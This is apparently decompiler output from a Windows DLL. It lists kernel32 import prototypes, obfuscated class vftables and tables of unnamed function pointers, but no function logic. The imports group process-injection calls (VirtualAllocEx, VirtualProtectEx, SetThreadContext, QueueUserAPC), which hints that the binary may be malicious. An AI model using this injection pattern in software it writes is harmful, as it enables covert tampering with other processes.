// extern BOOL (__stdcall *ProcessIdToSessionId)(DWORD dwProcessId, DWORD *pSessionId);
// extern HANDLE (__stdcall *CreateFileMappingW)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern DWORD (__stdcall *GetVersion)();
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern BOOL (__stdcall *SetFileTime)(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFullPathNameW)(LPCWSTR lpFileName, DWORD nBufferLength, LPWSTR lpBuffer, LPWSTR *lpFilePart);
// extern BOOL (__stdcall *FlushFileBuffers)(HANDLE hFile);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern BOOL (__stdcall *FileTimeToLocalFileTime)(const FILETIME *lpFileTime, LPFILETIME lpLocalFileTime);
// extern BOOL (__stdcall *GetFileInformationByHandle)(HANDLE hFile, LPBY_HANDLE_FILE_INFORMATION lpFileInformation);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *SetEndOfFile)(HANDLE hFile);
// extern BOOL (__stdcall *LocalFileTimeToFileTime)(const FILETIME *lpLocalFileTime, LPFILETIME lpFileTime);
// extern BOOL (__stdcall *GetFileTime)(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *SystemTimeToFileTime)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// extern DWORD (__stdcall *GetTickCount)();
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *GetVolumeInformationW)(LPCWSTR lpRootPathName, LPWSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPWSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern BOOL (__stdcall *DeleteFileW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern DWORD (__stdcall *GetLongPathNameW)(LPCWSTR lpszShortPath, LPWSTR lpszLongPath, DWORD cchBuffer);
// extern BOOL (__stdcall *RemoveDirectoryW)(LPCWSTR lpPathName);
// extern BOOL (__stdcall *GetExitCodeProcess)(HANDLE hProcess, LPDWORD lpExitCode);
// extern LPVOID (__stdcall *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern DWORD (__stdcall *SearchPathW)(LPCWSTR lpPath, LPCWSTR lpFileName, LPCWSTR lpExtension, DWORD nBufferLength, LPWSTR lpBuffer, LPWSTR *lpFilePart);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern UINT (__stdcall *GetTempFileNameW)(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
// extern DWORD (__stdcall *GetTempPathW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern DWORD (__stdcall *GetCurrentDirectoryW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern UINT (__stdcall *GetWindowsDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern DWORD (__stdcall *TlsAlloc)();
// extern BOOL (__stdcall *TlsFree)(DWORD dwTlsIndex);
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern BOOL (__stdcall *IsBadStringPtrA)(LPCSTR lpsz, UINT_PTR ucchMax);
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern SIZE_T (__stdcall *VirtualQueryEx)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// extern BOOL (__stdcall *VirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern BOOL (__stdcall *VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern BOOL (__stdcall *GetThreadContext)(HANDLE hThread, LPCONTEXT lpContext);
// extern BOOL (__stdcall *SetThreadContext)(HANDLE hThread, const CONTEXT *lpContext);
// extern DWORD (__stdcall *QueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
// extern DWORD (__stdcall *WaitForMultipleObjectsEx)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds, BOOL bAlertable);
// extern LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// extern HANDLE (__stdcall *OpenFileMappingW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern LONG (__stdcall *InterlockedExchange)(volatile LONG *Target, LONG Value);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall *RaiseException)(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
const IID riid = { 136441u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
const IID rclsid = { 136193u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
_UNKNOWN unk_1006FEEC; // weak
void *ikc::izq_ezibc::`vftable' = &sub_10034E40; // weak
void *nxys_uwip::`vftable' = &sub_10035037; // weak
void *ikc::qlurhxmnb::`vftable' = &sub_1003A3D7; // weak
void *ikc::sjn_wxme::`vftable' = &sub_1003A3F3; // weak
void *ikc::zji_ljuxnx::`vftable' = &sub_1003A415; // weak
void *ikc::rnp_nhgjjqmxr::`vftable' = &sub_10055022; // weak
int (__thiscall *off_1007293C)(void *Block, char) = &sub_10001DE9; // weak
int (__thiscall *off_10072944[2])(void *Block, char) = { &unknown_libname_1, &sub_10002A8C }; // weak
int (__thiscall *off_10072948)(void *Block, char) = &sub_10002A8C; // weak
int (__thiscall *off_100729A4)(void *Block, char) = &unknown_libname_2; // weak
int (__thiscall *off_100729C4)(void *Block, char) = &sub_10001DB0; // weak
int (__thiscall *off_100729FC)(void *Block, char) = &unknown_libname_3; // weak
int (__thiscall *off_10072A1C)(void *Block, char) = &sub_10001089; // weak
int (__thiscall *off_10072A24)(void *Block, char) = &sub_1000215B; // weak
int (__thiscall *off_10072A44)(void *Block, char) = &sub_10002177; // weak
char byte_10072A68[16] =
{
  '\x19',
  '\x0E',
  '\t',
  '\a',
  '\x05',
  '\x05',
  '\x04',
  '\x04',
  '\x04',
  '\x03',
  '\x03',
  '\x03',
  '\x02',
  '\x02',
  '\x02',
  '\x02'
}; // weak
_UNKNOWN unk_10072BA8; // weak
_UNKNOWN unk_10072BB0; // weak
int (__thiscall *off_10072BE0)(void *Block, char) = &sub_10002DE5; // weak
int (__thiscall *off_10072BE8)(void *Block, char) = &unknown_libname_4; // weak
int (__thiscall *off_10072BF0)(void *Block, char) = &sub_10002E5B; // weak
int (__thiscall *off_10072BF8)(void *Block, char) = &sub_100030D3; // weak
int (__thiscall *off_10072C00)(void *Block, char) = &sub_10003388; // weak
int (__thiscall *off_10072C08)(void *Block, char) = &sub_10003533; // weak
int (*off_10072C34[5])() = { &sub_10003805, &sub_1000382A, &sub_100037E3, &sub_100037C1, &sub_1000388F }; // weak
int (__thiscall *off_10072D0C)(void *Block, char) = &sub_10003EC3; // weak
int (__thiscall *off_10072D24)(void *Block, char) = &sub_100041B8; // weak
int (__thiscall *off_10072D2C)(void *Block, char) = &sub_1000483E; // weak
int (__thiscall *off_10072D44)(void *Block, char) = &sub_10004E7F; // weak
int (__thiscall *off_10072D60)(void *Block, char) = &sub_10005B4C; // weak
int (__thiscall *off_10072DA0)(void *Block, char) = &sub_10005B78; // weak
int (__thiscall *off_10072DD8)(void *Block, char) = &unknown_libname_5; // weak
int (__thiscall *off_10072DF8)(void *Block, char) = &unknown_libname_6; // weak
int (__thiscall *off_10072E18)(void *Block, char) = &sub_10004EF2; // weak
int (__thiscall *off_10072E58)(void *Block, char) = &sub_10005BCE; // weak
int (__thiscall *off_10072E98)(void *Block, char) = &sub_10005BEA; // weak
int (__thiscall *off_10072ED0)(void *Block, char) = &unknown_libname_7; // weak
int (__thiscall *off_10072EF0)(void *Block, char) = &unknown_libname_8; // weak
int (__thiscall *off_10072F10)(void *Block, char) = &sub_1000660D; // weak
int (__thiscall *off_10072F30)(void *Block, char) = &sub_10006629; // weak
int (__thiscall *off_10072F50)(void *Block, char) = &sub_10006645; // weak
int (__thiscall *off_10072F70)(void *Block, char) = &sub_10006661; // weak
int (__thiscall *off_10072F90)(void *Block, char) = &sub_10006B15; // weak
int (*off_10072FA8)() = &sub_10007010; // weak
const wchar_t word_10072FBC = 0u; // idb
int (__stdcall *off_10072FC0)(char) = &sub_10007E18; // weak
_UNKNOWN unk_10072FC8; // weak
int (*off_10072FD4)() = &sub_10007010; // weak
int (__thiscall *off_10072FE8)(void *Block, char) = &sub_100087B6; // weak
int (__thiscall *off_1007300C)(void *Block, char) = &sub_100077A0; // weak
int (__thiscall *off_10073038[2])(void *Block, char) = { &sub_10007D91, &unknown_libname_9 }; // weak
int (__thiscall *off_1007303C)(void *Block, char) = &unknown_libname_9; // weak
int (__thiscall *off_1007305C)(void *Block, char) = &unknown_libname_10; // weak
int (__thiscall *off_1007307C)(void *Block, char) = &sub_1000879A; // weak
int (__thiscall *off_100730B8)(void *Block, char) = &sub_1000877E; // weak
int (__thiscall *off_10073114)(void *Block, char) = &sub_100077F6; // weak
int (__thiscall *off_1007314C)(void *Block, char) = &unknown_libname_11; // weak
int (__thiscall *off_1007316C)(void *Block, char) = &sub_10007CF6; // weak
int (__thiscall *off_1007318C)(void *Block, char) = &sub_10007DAD; // weak
int (__thiscall *off_100731AC)(void *Block, char) = &sub_10007DC9; // weak
int (*off_100731CC)() = &sub_10008B1B; // weak
int (*off_100731D4)() = &sub_10007010; // weak
int (__thiscall *off_100731E8[2])(void *Block, char) = { &sub_10009149, &sub_10009339 }; // weak
int (__thiscall *off_100731EC)(void *Block, char) = &sub_10009339; // weak
int (__stdcall *off_100731F0)(char) = &sub_100093DB; // weak
_UNKNOWN unk_100731F8; // weak
int (__thiscall *off_10073204[2])(void *, char) = { &sub_10002AA8, &sub_10009ABE }; // weak
int (__thiscall *off_10073208)(void *Block, char) = &sub_10009ABE; // weak
int (__thiscall *off_10073210)(void *Block, char) = &sub_1000B8AB; // weak
int (__thiscall *off_1007326C)(void *Block, char) = &sub_1000AF54; // weak
int (__thiscall *off_100732A4)(void *Block, char) = &sub_1000AF73; // weak
int (__thiscall *off_100732C4)(void *Block, char) = &sub_1000AF93; // weak
int (__thiscall *off_100732E4)(void *Block, char) = &sub_1000B2CC; // weak
int (__thiscall *off_10073304)(void *Block, char) = &sub_1000B2EB; // weak
int (__thiscall *off_10073324[2])(void *Block, char) = { &sub_1000B9D0, &sub_1000BB2D }; // weak
int (__thiscall *off_10073328)(void *Block, char) = &sub_1000BB2D; // weak
void (__noreturn *off_1007332C)() = &_purecall; // weak
int (__cdecl *off_10073330[2])(int, int) = { &sub_1000BF21, &sub_1000BF79 }; // weak
int (__thiscall *off_10073358[2])(void *Block, char) = { &sub_1000C2F3, &sub_1000C1A9 }; // weak
int (__thiscall *off_1007335C)(void *Block, char) = &sub_1000C1A9; // weak
int (__stdcall *off_10073360)(char) = &sub_1000CD06; // weak
_UNKNOWN unk_10073368; // weak
int (__stdcall *off_10073370)(char) = &sub_1000CCB0; // weak
_UNKNOWN unk_10073378; // weak
int (__thiscall *off_10073380)(void *Block, char) = &sub_1000CA5F; // weak
int (__thiscall *off_100733E8)(void *Block, char) = &sub_1000C9C0; // weak
int (__thiscall *off_10073458)(void *Block, char) = &sub_1000DED0; // weak
int (__thiscall *off_10073460)(void *Block, char) = &sub_1000DFDA; // weak
int (__thiscall *off_10073468)(void *Block, char) = &sub_1000E0A0; // weak
int (__thiscall *off_10073470)(void *Block, char) = &sub_1000E117; // weak
int (__thiscall *off_10073478)(void *Block, char) = &sub_1000E22F; // weak
int (__thiscall *off_10073480)(void *Block, char) = &sub_1000E2A6; // weak
int (__thiscall *off_10073488)(void *Block, char) = &sub_1000E39E; // weak
int (__thiscall *off_100734A0)(void *Block, char) = &sub_1000E378; // weak
int (__thiscall *off_100734B8)(void *Block, char) = &sub_1000E4A2; // weak
int (__thiscall *off_100734D0)(void *Block, char) = &sub_1000E47C; // weak
int (__thiscall *off_100734E8)(void *Block, char) = &sub_1000E576; // weak
int (__thiscall *off_10073504)(void *Block, char) = &sub_1000E653; // weak
int (__thiscall *off_10073520)(void *Block, char) = &sub_1000E601; // weak
int (__stdcall *off_1007353C)(char) = &sub_1000EB2F; // weak
_UNKNOWN unk_10073544; // weak
int (__thiscall *off_10073550)(void *Block, char) = &sub_1000E804; // weak
int (__thiscall *off_10073590)(void *Block, char) = &sub_1000EDB8; // weak
int (__thiscall *off_100735BC[2])(void *Block, char) = { &sub_1000F212, &sub_1000340C }; // weak
int (__thiscall *off_100735C0)(void *Block, char) = &sub_1000340C; // weak
int (__thiscall *off_100735D8)(void *Block, char) = &sub_1000F61F; // weak
int (__thiscall *off_100735E8)(void *Block, char) = &sub_1000F295; // weak
int (__thiscall *off_10073604)(void *Block, char) = &sub_1000F2E8; // weak
int (__thiscall *off_10073638)(void *Block, char) = &sub_10011C6E; // weak
int (__thiscall *off_10073694)(void *Block, char) = &sub_1000FCCB; // weak
int (__thiscall *off_100736A0)(void *Block, char) = &sub_10011514; // weak
int (__thiscall *off_100736F0)(void *Block, char) = &sub_100114C8; // weak
int (__thiscall *off_10073740)(void *Block, char) = &sub_10010A88; // weak
int (__thiscall *off_10073778)(void *Block, char) = &sub_10010AA7; // weak
int (__thiscall *off_10073798)(void *Block, char) = &sub_10010AC7; // weak
int (__thiscall *off_100737B8)(void *Block, char) = &sub_10010AE7; // weak
int (__thiscall *off_100737F8)(void *Block, char) = &sub_10010B21; // weak
int (__thiscall *off_10073830)(void *Block, char) = &sub_10010B40; // weak
int (__thiscall *off_10073850)(void *Block, char) = &sub_10010B60; // weak
int (__thiscall *off_10073870[2])(void *Block, char) = { &sub_10010B80, &sub_100113FE }; // weak
int (__thiscall *off_10073874)(void *Block, char) = &sub_100113FE; // weak
int (__thiscall *off_10073894)(void *Block, char) = &sub_1001146B; // weak
int (__thiscall *off_100738B4)(void *Block, char) = &sub_1001148A; // weak
int (__thiscall *off_100738D4)(void *Block, char) = &sub_100114A9; // weak
int (__thiscall *off_100738F4[2])(void *Block, char) = { &sub_10011F0C, &sub_1001200E }; // weak
int (__thiscall *off_100738F8)(void *Block, char) = &sub_1001200E; // weak
int (__thiscall *off_10073900[2])(void *Block, char) = { &sub_10012299, &sub_10012AFE }; // weak
int (__thiscall *off_10073904)(void *Block, char) = &sub_10012AFE; // weak
int (__thiscall *off_10073914[3])(void *Block, char) = { &sub_10012C3A, &sub_10012CA0, &sub_10012BFD }; // weak
int (__thiscall *off_10073918[2])(void *Block, char) = { &sub_10012CA0, &sub_10012BFD }; // weak
int (__thiscall *off_1007391C)(void *Block, char) = &sub_10012BFD; // weak
int (__thiscall *off_10073924)(void *Block, char) = &sub_10013270; // weak
int (__thiscall *off_1007392C)(void *Block, char) = &sub_10012F6C; // weak
int (__thiscall *off_10073948)(void *Block, char) = &sub_10012D5E; // weak
int (__thiscall *off_10073958)(void *Block, char) = &sub_100133DC; // weak
int (__thiscall *off_10073968[2])(void *Block, char) = { &sub_100135C5, &sub_10013E8D }; // weak
int (__thiscall *off_1007396C)(void *Block, char) = &sub_10013E8D; // weak
int (__thiscall *off_10073974)(void *Block, char) = &sub_10013D22; // weak
int (__thiscall *off_1007397C[2])(void *Block, char) = { &sub_10014BA3, &sub_10014F97 }; // weak
int (__thiscall *off_10073980)(void *Block, char) = &sub_10014F97; // weak
int (__stdcall *off_100739B0)(int) = &sub_100152F1; // weak
int (__thiscall *off_100739D8)(void *Block, char) = &sub_100157F4; // weak
int (__thiscall *off_10073A18)(void *Block, char) = &sub_1001582E; // weak
int (__thiscall *off_10073A50)(void *Block, char) = &sub_1001584D; // weak
int (__thiscall *off_10073A70)(void *Block, char) = &sub_1001586D; // weak
int (__thiscall *off_10073A90)(void *Block, char) = &sub_10015D4C; // weak
int (__thiscall *off_10073AB0)(void *Block, char) = &sub_10015D6B; // weak
int (__thiscall *off_10073AD0)(void *Block, char) = &sub_10015F65; // weak
int (__thiscall *off_10073AD8)(void *Block, char) = &sub_100160C2; // weak
int (__thiscall *off_10073AE0)(void *Block, char) = &sub_10016147; // weak
int (__thiscall *off_10073B20)(void *Block, char) = &sub_1001677E; // weak
int (__thiscall *off_10073B60)(void *Block, char) = &sub_100167B8; // weak
int (__thiscall *off_10073B98)(void *Block, char) = &sub_100167D7; // weak
int (__thiscall *off_10073BB8)(void *Block, char) = &sub_100167F7; // weak
int (__thiscall *off_10073BD8)(void *Block, char) = &sub_10016CE1; // weak
int (__thiscall *off_10073BF8)(void *Block, char) = &sub_10016D00; // weak
int (__thiscall *off_10073C18)(void *Block, char) = &sub_10016FB1; // weak
int (__stdcall *off_10073C1C)(char) = &sub_1001753F; // weak
_UNKNOWN unk_10073C24; // weak
_UNKNOWN unk_10073C2C; // weak
int (__stdcall *off_10073C34)(char) = &sub_1001751D; // weak
_UNKNOWN unk_10073C3C; // weak
_UNKNOWN unk_10073C44; // weak
int (__thiscall *off_10073C50)(void *Block, char) = &sub_10017093; // weak
int (*off_10073CCC[5])() = { &sub_10017870, &sub_10017897, &sub_100178EA, &sub_100178BE, &sub_1001792E }; // weak
int (__stdcall *off_10073CF4)(char) = &sub_10017F11; // weak
_UNKNOWN unk_10073CFC; // weak
_UNKNOWN unk_10073D04; // weak
int (__stdcall *off_10073D0C)(char) = &sub_10018756; // weak
_UNKNOWN unk_10073D14; // weak
_UNKNOWN unk_10073D1C; // weak
int (__stdcall *off_10073D24)(char) = &sub_10018925; // weak
_UNKNOWN unk_10073D2C; // weak
_UNKNOWN unk_10073D34; // weak
int (__thiscall *off_10073D40)(void *Block, char) = &sub_10017CD6; // weak
int (__thiscall *off_10073DB4[2])(void *Block, char) = { &sub_10018A5A, &sub_10018CEB }; // weak
int (__thiscall *off_10073DB8)(void *Block, char) = &sub_10018CEB; // weak
int (__thiscall *off_10073DC0)(void *Block, char) = &sub_10018CC5; // weak
int (__thiscall *off_10073DD0)(void *Block, char) = &sub_100190A6; // weak
int (__thiscall *off_10073DE0[5])(void *Block, char) = { &sub_10019816, &sub_10019835, &sub_10019854, &sub_100191DE, &sub_10019381 }; // weak
int (__thiscall *off_10073DE4[4])(void *Block, char) = { &sub_10019835, &sub_10019854, &sub_100191DE, &sub_10019381 }; // weak
int (__thiscall *off_10073DE8[3])(void *Block, char) = { &sub_10019854, &sub_100191DE, &sub_10019381 }; // weak
int (__thiscall *off_10073DEC[2])(void *Block, char) = { &sub_100191DE, &sub_10019381 }; // weak
int (__thiscall *off_10073DF0)(void *Block, char) = &sub_10019381; // weak
int (__thiscall *off_10073DF8)(void *Block, char) = &sub_10019B34; // weak
int (__thiscall *off_10073E00)(void *Block, char) = &sub_10019DA0; // weak
int (__thiscall *off_10073E30)(void *Block, char) = &sub_1001A01B; // weak
int (__thiscall *off_10074068)(void *Block, char) = &sub_1001B36C; // weak
int (__stdcall *off_1007406C)(char) = &sub_1001AC67; // weak
_UNKNOWN unk_10074074; // weak
_UNKNOWN unk_1007407C; // weak
int (__stdcall *off_10074084)(char) = &sub_1001AD92; // weak
_UNKNOWN unk_1007408C; // weak
_UNKNOWN unk_10074094; // weak
int (__thiscall *off_100740A0)(void *Block, char) = &sub_1001B42F; // weak
int (__thiscall *off_100740F4)(void *Block, char) = &sub_1001B62F; // weak
int (__thiscall *off_10074124)(void *Block, char) = &sub_1001B82D; // weak
int (__thiscall *off_10074148)(void *Block, char) = &sub_1001BC05; // weak
int (__thiscall *off_10074150)(void *Block, char) = &sub_1001B9E2; // weak
int (__thiscall *off_10074188)(void *Block, char) = &sub_1001BDEB; // weak
int (__thiscall *off_10074190)(void *Block, char) = &sub_1001BF0C; // weak
int (__thiscall *off_10074198)(void *Block, char) = &sub_1001BF8B; // weak
int (__thiscall *off_100741C8[5])(void *Block, char) = { &sub_1001C191, &sub_1001C8A8, &sub_1001C917, &sub_1001C9F5, &sub_1001C231 }; // weak
int (__thiscall *off_100741CC[4])(void *Block, char) = { &sub_1001C8A8, &sub_1001C917, &sub_1001C9F5, &sub_1001C231 }; // weak
int (__thiscall *off_100741D0[3])(void *Block, char) = { &sub_1001C917, &sub_1001C9F5, &sub_1001C231 }; // weak
int (__thiscall *off_100741D4[2])(void *Block, char) = { &sub_1001C9F5, &sub_1001C231 }; // weak
int (__thiscall *off_100741D8)(void *Block, char) = &sub_1001C231; // weak
int (__thiscall *off_100741E0)(void *Block, char) = &sub_1001C4A9; // weak
int (__thiscall *off_100741E8)(void *Block, char) = &sub_1001C212; // weak
int (__thiscall *off_100741F0)(void *Block, char) = &sub_1001CC37; // weak
int (__thiscall *off_10074220)(void *Block, char) = &sub_1001CC89; // weak
int (__thiscall *off_10074250)(void *Block, char) = &sub_1001CFBD; // weak
int (__thiscall *off_10074258)(void *Block, char) = &sub_1001D190; // weak
int (__thiscall *off_10074260)(void *Block, char) = &sub_1001CE5F; // weak
int (__thiscall *off_10074268[5])(void *Block, char) = { &sub_1001DCB2, &sub_1001DF7D, &sub_1001E5D2, &sub_1001E82F, &sub_1001E48D }; // weak
int (__thiscall *off_1007426C[4])(void *Block, char) = { &sub_1001DF7D, &sub_1001E5D2, &sub_1001E82F, &sub_1001E48D }; // weak
int (__thiscall *off_10074270[3])(void *Block, char) = { &sub_1001E5D2, &sub_1001E82F, &sub_1001E48D }; // weak
int (__thiscall *off_10074274[2])(void *Block, char) = { &sub_1001E82F, &sub_1001E48D }; // weak
int (__thiscall *off_10074278)(void *Block, char) = &sub_1001E48D; // weak
int (__thiscall *off_10074280)(void *Block, char) = &sub_1001F1AF; // weak
int (__thiscall *off_10074288)(void *Block, char) = &sub_10020BB3; // weak
int (__stdcall *off_10074290)(char) = &sub_10020E57; // weak
_UNKNOWN unk_10074298; // weak
int (__thiscall *off_100742A0)(void *Block, char) = &sub_100211CE; // weak
int (__thiscall *off_100742D4)(void *Block, char) = &sub_100213A4; // weak
int (__thiscall *off_10074304)(void *Block, char) = &sub_10021648; // weak
int (__thiscall *off_10074310)(void *Block, char) = &sub_10021553; // weak
int (__thiscall *off_1007431C)(void *Block, char) = &sub_10022396; // weak
int (__thiscall *off_10074328)(void *Block, char) = &sub_1002418A; // weak
int (__thiscall *off_10074360)(void *Block, char) = &sub_1002312D; // weak
int (__thiscall *off_1007438C[2])(void *Block, char) = { &sub_1002367A, &sub_1002314C }; // weak
int (__thiscall *off_10074390)(void *Block, char) = &sub_1002314C; // weak
int (__thiscall *off_100743B0)(void *Block, char) = &sub_1002316C; // weak
int (__thiscall *off_100743D0)(void *Block, char) = &sub_10024161; // weak
int (__thiscall *off_1007442C)(void *Block, char) = &sub_1002318C; // weak
int (__thiscall *off_10074464)(void *Block, char) = &sub_100231AB; // weak
int (__thiscall *off_10074484)(void *Block, char) = &sub_1002365A; // weak
int (__thiscall *off_100744A4)(void *Block, char) = &sub_10023699; // weak
int (__thiscall *off_100744C4)(void *Block, char) = &sub_100236B8; // weak
int (__stdcall *off_100744E4)(char) = &sub_10024712; // weak
_UNKNOWN unk_100744EC; // weak
int (__stdcall *off_100744F4)(char) = &sub_100252AB; // weak
_UNKNOWN unk_100744FC; // weak
int (__thiscall *off_10074504)(void *Block, char) = &sub_10024B9B; // weak
int (__thiscall *off_10074514[3])(void *Block, char) = { &sub_100256B9, &sub_10025723, &sub_10025A7A }; // weak
int (__thiscall *off_10074518[2])(void *Block, char) = { &sub_10025723, &sub_10025A7A }; // weak
int (__thiscall *off_1007451C)(void *Block, char) = &sub_10025A7A; // weak
int (__thiscall *off_10074550)(void *Block, char) = &sub_10025C0D; // weak
int (__thiscall *off_100745A4[5])(void *Block, char) = { &sub_100261A1, &sub_100261DF, &sub_100261C0, &sub_100261FE, &sub_10027FC2 }; // weak
int (__thiscall *off_100745A8[4])(void *Block, char) = { &sub_100261DF, &sub_100261C0, &sub_100261FE, &sub_10027FC2 }; // weak
int (__thiscall *off_100745AC[3])(void *Block, char) = { &sub_100261C0, &sub_100261FE, &sub_10027FC2 }; // weak
int (__thiscall *off_100745B0[2])(void *Block, char) = { &sub_100261FE, &sub_10027FC2 }; // weak
int (__thiscall *off_100745B4)(void *, char) = &sub_10027FC2; // weak
int (__thiscall *off_100745D0)(void *Block, char) = &sub_10027FA3; // weak
int (__thiscall *off_1007462C)(void *Block, char) = &sub_100274CE; // weak
int (__thiscall *off_10074664)(void *Block, char) = &sub_100274ED; // weak
int (__thiscall *off_10074684)(void *Block, char) = &sub_1002750D; // weak
int (__thiscall *off_100746A4)(void *Block, char) = &sub_1002787B; // weak
int (__thiscall *off_100746C4)(void *Block, char) = &sub_1002789A; // weak
int (__thiscall *off_100746E4[2])(void *Block, char) = { &sub_10028606, &sub_10028CB5 }; // weak
int (__thiscall *off_100746E8)(void *Block, char) = &sub_10028CB5; // weak
int (__thiscall *off_10074728)(void *Block, char) = &sub_10028CEF; // weak
int (__thiscall *off_10074760)(void *Block, char) = &sub_10028D0E; // weak
int (__thiscall *off_10074780)(void *Block, char) = &sub_10028D2E; // weak
int (__thiscall *off_100747A0)(void *Block, char) = &sub_1002923A; // weak
int (__thiscall *off_100747C0)(void *Block, char) = &sub_10029259; // weak
int (__thiscall *off_100747E0[2])(void *Block, char) = { &sub_100299D5, &sub_10029D6D }; // weak
int (__thiscall *off_100747E4)(void *Block, char) = &sub_10029D6D; // weak
int (__stdcall *off_10074810)(int) = &sub_1002A46D; // weak
int (__thiscall *off_1007483C)(void *Block, char) = &sub_10029CA5; // weak
int (__thiscall *off_10074848)(void *Block, char) = &sub_1002A5A1; // weak
int (__thiscall *off_10074898[2])(void *Block, char) = { &sub_1002A49B, &sub_1002C2A1 }; // weak
int (__thiscall *off_1007489C)(void *Block, char) = &sub_1002C2A1; // weak
int (__thiscall *off_100748C0)(void *Block, char) = &sub_1002B3FC; // weak
int (__thiscall *off_100748EC[2])(void *Block, char) = { &sub_1002B907, &sub_1002B41B }; // weak
int (__thiscall *off_100748F0)(void *Block, char) = &sub_1002B41B; // weak
int (__thiscall *off_10074910)(void *Block, char) = &sub_1002B43B; // weak
int (__thiscall *off_10074930)(void *Block, char) = &sub_1002C263; // weak
